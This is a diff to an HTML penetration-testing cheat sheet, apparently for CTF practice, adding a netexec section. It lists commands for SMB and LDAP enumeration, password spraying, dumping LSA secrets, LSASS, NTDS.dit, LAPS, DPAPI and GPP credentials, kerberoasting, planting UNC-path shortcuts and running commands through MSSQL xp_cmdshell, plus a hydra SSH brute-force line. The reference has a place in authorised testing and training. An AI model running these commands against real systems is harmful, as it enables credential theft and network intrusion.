@@ -192,6 +192,15 @@
 <li><a href="#ssh">ssh</a></li>
 </ul>
 </li>
+<li><a href="#netexec">netexec</a>
+<ul>
+<li><a href="#smb">smb</a></li>
+<li><a href="#ftp">ftp</a></li>
+<li><a href="#ldap">ldap</a></li>
+<li><a href="#bloodhound">bloodhound</a></li>
+<li><a href="#mssql">mssql</a></li>
+</ul>
+</li>
 </ul>
 </li>
 <li><a href="#powershell-scripts">powershell scripts</a>
@@ -234,6 +243,170 @@
 <h4 id="ssh">ssh</h4>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>hydra -v -V -u -l <span style="color:#ff79c6">{</span>Username<span style="color:#ff79c6">}</span> -P <span style="color:#ff79c6">{</span>Big_Passwordlist<span style="color:#ff79c6">}</span> -t <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">{</span>IP<span style="color:#ff79c6">}</span> ssh
 </span></span></code></pre></div><!-- raw HTML omitted -->
+<h3 id="netexec">netexec</h3>
+<!-- raw HTML omitted -->
+<h4 id="smb">smb</h4>
+<ul>
+<li>initial enumeration</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb target
+</span></span></code></pre></div><ul>
+<li>null authentication</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb target -u <span style="color:#f1fa8c">&#39;&#39;</span> -p <span style="color:#f1fa8c">&#39;&#39;</span>
+</span></span></code></pre></div><ul>
+<li>guest authentication</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb target -u <span style="color:#f1fa8c">&#39;guest&#39;</span> -p <span style="color:#f1fa8c">&#39;&#39;</span>
+</span></span></code></pre></div><ul>
+<li>list shares</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb target -u <span style="color:#f1fa8c">&#39;&#39;</span> -p <span style="color:#f1fa8c">&#39;&#39;</span> --shares
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb target -u username -p password --shares
+</span></span></code></pre></div><ul>
+<li>list usernames</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb target -u <span style="color:#f1fa8c">&#39;&#39;</span> -p <span style="color:#f1fa8c">&#39;&#39;</span> --users
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb target -u <span style="color:#f1fa8c">&#39;&#39;</span> -p <span style="color:#f1fa8c">&#39;&#39;</span> --rid-brute
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb target -u username -p password --users
+</span></span></code></pre></div><ul>
+<li>local authentication</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb target -u username -p password --local-auth
+</span></span></code></pre></div><ul>
+<li>using kerberos</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb target -u username -p password -k
+</span></span></code></pre></div><ul>
+<li>password spray</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb target -u users.txt -p password --continue-on-success
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb target -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec ssh target -u username -p password --continue-on-success
+</span></span></code></pre></div><ul>
+<li>all in one</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb target -u username -p password --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
+</span></span></code></pre></div><ul>
+<li>spider_plus module</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb target -u username -p password -M spider_plus
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb target -u username -p password -k --get-file target_file output_file --share sharename
+</span></span></code></pre></div><ul>
+<li>dump a specific file</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb target -u username -p password -k --get-file target_file output_file --share sharename
+</span></span></code></pre></div><ul>
+<li>dump lsa secrets</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb target -u username -p password --local-auth --lsa
+</span></span></code></pre></div><ul>
+<li>group policy preferences</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb target -u username -p password -M gpp_password
+</span></span></code></pre></div><ul>
+<li>dump laps v1 and v2 password</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb target -u username -p password --laps
+</span></span></code></pre></div><ul>
+<li>dump dpapi credentials</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb target -u username -p password --laps --dpapi
+</span></span></code></pre></div><ul>
+<li>dump ntds.dit</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb target -u username -p password --ntds
+</span></span></code></pre></div><ul>
+<li>webdav - checks whether the webclient service is running on the target</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb ip -u username -p password -M webdav 
+</span></span></code></pre></div><ul>
+<li>veeam - extracts credentials from local veeam sql database</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb target -u username -p password -M veeam
+</span></span></code></pre></div><ul>
+<li>slinky - creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb ip -u username -p password -M slinky 
+</span></span></code></pre></div><ul>
+<li>ntdsutil - dump ntds with ntdsutil</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb ip -u username -p password -M ntdsutil
+</span></span></code></pre></div><ul>
+<li>dump lsass</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb target -u username -p password -M lsassy
+</span></span></code></pre></div><ul>
+<li>retrieve msol account password</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec smb target -u username -p password -M msol
+</span></span></code></pre></div><!-- raw HTML omitted -->
+<h4 id="ftp">ftp</h4>
+<ul>
+<li>list folders and files</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec ftp target -u username -p password --ls
+</span></span></code></pre></div><ul>
+<li>list files inside a folder</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec ftp target -u username -p password --ls folder_name
+</span></span></code></pre></div><ul>
+<li>retrieve a specific file</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec ftp target -u username -p password --ls folder_name --get file_name
+</span></span></code></pre></div><!-- raw HTML omitted -->
+<h4 id="ldap">ldap</h4>
+<ul>
+<li>enumerate users using ldap</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec ldap target -u <span style="color:#f1fa8c">&#39;&#39;</span> -p <span style="color:#f1fa8c">&#39;&#39;</span> --users
+</span></span></code></pre></div><ul>
+<li>all in one</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec ldap target -u username -p password --trusted-for-delegation  --password-not-required --admin-count --users --groups
+</span></span></code></pre></div><ul>
+<li>kerberoast</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec ldap target -u username -p password --kerberoasting kerb.txt
+</span></span></code></pre></div><ul>
+<li>asreproast</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec ldap target -u username -p password --asreproast asrep.txt
+</span></span></code></pre></div><ul>
+<li>gmsa</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec ldap target -u username -p password --gmsa-convert-id id
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec ldap domain -u username -p password --gmsa-decrypt-lsa gmsa_account
+</span></span></code></pre></div><ul>
+<li>check the machine account quota</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec ldap target -u username -p password -M maq
+</span></span></code></pre></div><ul>
+<li>adcs enumeration</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec ldap target -u username -p password -M adcs
+</span></span></code></pre></div><!-- raw HTML omitted -->
+<h4 id="bloodhound">bloodhound</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec ldap target -u username -p password --bloodhound -ns ip --collection All
+</span></span></code></pre></div><!-- raw HTML omitted -->
+<h4 id="mssql">mssql</h4>
+<ul>
+<li>authentication</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec mssql target -u username -p password
+</span></span></code></pre></div><ul>
+<li>execute commands using xp_cmdshell</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec mssql target -u username -p password -x command_to_execute
+</span></span></code></pre></div><blockquote>
+<p>-X for powershell and -x for cmd</p>
+</blockquote>
+<ul>
+<li>get a file</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netexec mssql target -u username -p password --get-file output_file target_file
+</span></span></code></pre></div><p>source: <a href="https://github.com/seriotonctf/cme-nxc-cheat-sheet">https://github.com/seriotonctf/cme-nxc-cheat-sheet</a></p>
+<!-- raw HTML omitted -->
 <h2 id="powershell-scripts">powershell scripts</h2>
 <!-- raw HTML omitted -->
 <h3 id="decode-base64">decode base64</h3>
